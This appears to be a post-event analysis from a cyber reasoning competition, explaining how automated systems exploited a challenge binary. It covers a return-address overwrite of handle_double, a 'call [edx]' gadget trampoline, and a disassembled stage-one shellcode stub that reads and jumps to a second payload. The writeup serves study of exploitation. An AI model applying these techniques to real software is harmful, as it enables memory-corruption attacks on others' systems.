## Post Event Analysis

Post event analysis identified an alternate path to exploitation, taken by the CRS-generated POVs during CFE, as described below.

The author describes the vulnerability as:

    "Proving: hard. Controlling the buffer size requires precise inputs to a complex algorithm using trigonometric functions."

The reference POV transmissions are very different from the CRS transmissions.  The former is a long sequence that seems to iterate and includes significant interaction.  The Disekt POV is two transmits after the initial hello.

CRS POVs do not appear to include complex math functions, or significant interaction with the service.

All CRSs overwrote the handle\_double return address with the address of the very same gadget that was then used to return to a location in the stack containing exploit code (the code block reduces to a "call [edx]" instruction).

One team turned it into a type 2 by performing a receive from the phase I exploit code.  The reference overwrote the handle\_double return address with a negotiated value.

The receive operation in the reference read 0x88 bytes, while the CRS-generated POVs read 0x44 bytes.

Turned it into a type 2.

Overwrote return address of handle\_double with
the same 0x8040313 gadget address used by other CRS's, and used
that to return into the stack at baaaaeba.

That code then reads in the type 2 exploit, and jumps to it:

    BAAAAEBA push    3
    BAAAAEBC pop     eax
    BAAAAEBD cdq
    BAAAAEBE xor     ebx, ebx
    BAAAAEC0 mov     ecx, offset off_BAAA8CF0
    BAAAAEC5 mov     dl, 7Fh ; '
    BAAAAEC7 mov     esi, ebx
    BAAAAEC9 int     80h                             ; LINUX - sys_read
    BAAAAECB jmp     ecx

The overwrite of the handle\_double return address occurs during a
receive operation of 0x44 bytes into baaaaf4c:

    added backtrack START:0x80482c6:ret track addr: 0xbaaaaef8, value 0x8050313 : 1f1af97
    added backtrack:0x80483c7:mov byte ptr [ecx+eax],dl : 1d81f07 (bufcpy)
    added backtrack:0x80483b7:mov dl,byte ptr [ecx+eax] : 1d81f02 (bufcpy)
    added backtrack:0x805027d: follows kernel write of 0x8050313 to 0xbaaaaf74 : 1c3208d

The call stack at the receive is

    Address  Function
    -------  --------
    0805027B allocate+0x19  [receive]
    08048E9F protocol_with_recv_frame+0x5F
    080480D4 run_loop+0x14
    08048FC4 rx+0xE4
    08050229 _start+0x5

The phase I payload is received as part of the same receive/bufcpy operation.

Potential explanation:
The CRS-generated POVs exploit a much smaller overwrite than is required by the reference POV.  The small overwrite causes a return to a code block that equates to a "call [edx]" which lets them trampoline into their exploit code.
